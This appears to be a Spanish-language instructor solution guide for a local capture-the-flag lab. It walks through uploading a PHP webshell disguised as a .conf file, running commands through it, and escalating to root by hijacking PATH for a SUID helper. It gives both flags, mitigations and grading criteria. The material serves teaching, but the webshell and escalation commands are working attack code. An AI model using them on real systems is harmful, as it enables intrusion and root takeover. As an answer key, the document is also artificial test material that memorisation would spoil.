# ConfigGate — Solución y guía docente

> Este archivo contiene las dos banderas y la cadena completa de explotación.
> No debe distribuirse a estudiantes antes de la actividad.

## Resumen de la cadena

```text
Módulo de carga
    ↓
Extensión .conf no bloqueada
    ↓
Apache procesa .conf con PHP
    ↓
Webshell como www-data
    ↓
user.txt en /home/analyst
    ↓
report-helper SUID + PATH controlado
    ↓
root.txt
```

## 1. Levantar el laboratorio

Desde la carpeta del proyecto:

```bash
docker compose up --build -d
```

Comprobar que la página responde:

```bash
curl -i http://127.0.0.1:9000/
curl -i http://127.0.0.1:9000/transfer.php
```

## 2. Revisar el comportamiento de la carga

El formulario usa el campo `upload`. El servidor rechaza varias
extensiones PHP conocidas, pero deja pasar extensiones que no están en su lista
negra. Además, el directorio de cargas está dentro del document root y es
accesible por HTTP.

Crear un archivo local llamado `payload.conf` con este contenido:

```php
<?php
header('Content-Type: text/plain; charset=utf-8');
$cmd = $_GET['cmd'] ?? 'id';
echo "ConfigGate shell\n";
system($cmd);
?>
```

Subirlo con `curl`:

```bash
curl -i -F 'upload=@payload.conf;type=text/plain' \
  http://127.0.0.1:9000/transfer.php
```

La respuesta debe incluir un enlace a:

```text
http://127.0.0.1:9000/attachments/payload.conf
```

## 3. Confirmar ejecución de comandos

```bash
curl -G --data-urlencode 'cmd=id' \
  http://127.0.0.1:9000/attachments/payload.conf
```

La salida debe mostrar una identidad similar a:

```text
ConfigGate shell
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La vulnerabilidad es la combinación de tres decisiones inseguras:

1. El filtro usa una lista negra de extensiones en vez de una lista positiva.
2. La carpeta de cargas está bajo `/var/www/html`.
3. Apache está configurado para entregar el handler de PHP a los archivos
   `.conf` de esa carpeta.

## 4. Leer la bandera de usuario

```bash
curl -G --data-urlencode 'cmd=cat /home/analyst/user.txt' \
  http://127.0.0.1:9000/attachments/payload.conf
```

Resultado esperado:

```text
FLAG{configgate_upload_6e21}
```

## 5. Enumerar la escalada

Buscar el binario SUID preparado para el ejercicio:

```bash
curl -G --data-urlencode \
  'cmd=find / -perm -4000 -type f 2>/dev/null | grep report-helper' \
  http://127.0.0.1:9000/attachments/payload.conf
```

Inspeccionarlo:

```bash
curl -G --data-urlencode 'cmd=ls -l /usr/local/bin/report-helper' \
  http://127.0.0.1:9000/attachments/payload.conf
```

El helper ejecuta `tar` por nombre, usando el `PATH` heredado.
Por ello, una persona con ejecución como `www-data` puede colocar antes
en el `PATH` un programa llamado `tar`.

## 6. Preparar el `tar` controlado

El siguiente comando se ejecuta en la máquina atacante, no en el contenedor.
Genera un script pequeño y lo codifica para evitar problemas de comillas en la
URL:

```bash
TAR_B64=$(printf '%s\n' \
  '#!/bin/sh' \
  'cp /root/root.txt /var/www/html/attachments/root.txt' \
  'chmod 644 /var/www/html/attachments/root.txt' | base64 | tr -d '\n')
```

Escribirlo en `/tmp/tar` mediante la webshell:

```bash
curl -G \
  --data-urlencode "cmd=echo $TAR_B64 | base64 -d > /tmp/tar && chmod +x /tmp/tar" \
  http://127.0.0.1:9000/attachments/payload.conf
```

Ejecutar el helper con `/tmp` al inicio del `PATH`:

```bash
curl -G \
  --data-urlencode 'cmd=PATH=/tmp:/usr/bin:/bin /usr/local/bin/report-helper' \
  http://127.0.0.1:9000/attachments/payload.conf
```

El helper cambia a UID 0 y lanza `tar`. En realidad se ejecuta el
script `/tmp/tar`, que copia la bandera de root a un archivo legible
desde el directorio de cargas.

## 7. Leer la bandera de administrador

```bash
curl http://127.0.0.1:9000/attachments/root.txt
```

Resultado esperado:

```text
FLAG{configgate_path_hijack_91ad}
```

## Explicación técnica

### Ejecución inicial

`transfer.php` bloquea nombres como `shell.php`, pero acepta
`payload.conf`. La directiva `SetHandler application/x-httpd-php`
en `apache/configgate.conf` hace que Apache envíe ese archivo al
intérprete PHP. El contenido PHP se ejecuta y el parámetro `cmd` llega
a `system()`.

### Escalada

`/usr/local/bin/report-helper` tiene permisos `4755` y propietario
`root`. Después de elevar sus credenciales ejecuta:

```text
tar -czf /tmp/site-report.tgz /var/www/html
```

Como `tar` no se invoca con `/usr/bin/tar`, el atacante puede
controlar qué programa se encuentra primero con `PATH=/tmp:...`. El
`tar` falso se ejecuta como root y copia `root.txt` a un lugar que
Apache puede servir.

## Mitigaciones

- Usar una lista positiva de extensiones y validar el contenido real del
  archivo, no sólo el nombre enviado por el cliente.
- Guardar las cargas fuera del document root y servirlas mediante un endpoint
  que no permita ejecución.
- Desactivar handlers de ejecución en el directorio de cargas.
- Evitar `system()` para lanzar comandos con datos controlados por el
  usuario.
- En utilidades privilegiadas, usar rutas absolutas como `/usr/bin/tar` y
  limpiar completamente el entorno antes de ejecutar procesos.
- Eliminar el bit SUID de herramientas que no lo necesitan y aplicar mínimo
  privilegio.

## Nota para la evaluación

Una solución correcta debería demostrar, como mínimo:

- ejecución como `www-data` desde un archivo subido con extensión no
  bloqueada;
- lectura de `user.txt`;
- identificación de `report-helper` como SUID y vulnerable al `PATH`;
- lectura de `root.txt` después de la escalada.
